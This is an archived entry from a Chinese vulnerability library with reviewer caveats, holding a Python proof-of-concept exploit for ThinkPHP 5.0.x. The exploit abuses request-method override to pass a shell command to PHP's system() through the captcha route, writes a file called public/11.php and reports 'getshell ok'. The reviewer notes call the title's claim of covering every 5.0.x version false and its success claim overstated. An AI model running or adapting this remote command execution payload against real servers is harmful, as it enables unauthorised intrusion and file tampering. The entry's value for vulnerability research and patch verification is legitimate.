---
source: "白阁文库 BaizeSec/bylibrary"
product: "ThinkPHP / Request方法覆盖"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "thinkphp_5.0.x通杀gethell"
prerequisites: "来源所述条件，未列明部分仍待核：标题通杀5.0.x不成立，依captcha、system、可写public及版本"
side_effects: "未执行；本文需注意的操作影响：getshell成功实际仅静态文件写入；echo哈希到11.php没有PHP代码，返回getshell ok夸大能力；检测会覆盖固定文件且可陈旧误报；固定public/11.php可破坏原文件或命中旧残留，未清理、无唯一随机标识；通杀和网络行为不可靠；不检查POST响应，无timeout，固定captcha和public路径，5.0.24已修复不能覆盖"
source_status: "unknown"
id: "vw-84ede4283cb5d06504360045"
entity_id: "ve-84ede4283cb5d06504360045"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：标题通杀5.0.x不成立，依captcha、system、可写public及版本

代码与实验材料：完整类/两函数但无CLI调用；写固定11.php后匹配静态MD5文本

来源证据范围：白阁归档，无原作者

- **证据待核（1）**：getshell成功实际仅静态文件写入；依据：echo哈希到11.php没有PHP代码，返回getshell ok夸大能力。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **操作与副作用边界（2）**：检测会覆盖固定文件且可陈旧误报；依据：固定public/11.php可破坏原文件或命中旧残留，未清理、无唯一随机标识。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **操作与副作用边界（3）**：通杀和网络行为不可靠；依据：不检查POST响应，无timeout，固定captcha和public路径，5.0.24已修复不能覆盖。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

```HTML
# thinkphp 5.0.* 通杀getshell poc_1
import requests


def post_command(host):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    data = {
        "_method": "__construct",
        "filter[]": "system",
        "method": "get",
        "server[REQUEST_METHOD]": "echo 202cb962ac59075b964b07152d234b70 > 11.php"
    }
    target = host + "/public/index.php?s=captcha"
    print("Request: {}".format(target))
    r = requests.post(target, data=data, headers=headers)
    return True


# 验证 11.php是否存在
def md5_file_is_exist(host):
    rs = requests.get(host+"/public/11.php")
    if rs.status_code == 200 and "202cb962ac59075b964b07152d234b70" in rs.text:
        return True


class Exploit(object):

    def attack(self, url):
        post_command(url)
        if md5_file_is_exist(url):
            return "getshell ok. {}".format(url+"/public/11.php")

```


---

> 来源：白阁文库 BaizeSec/bylibrary
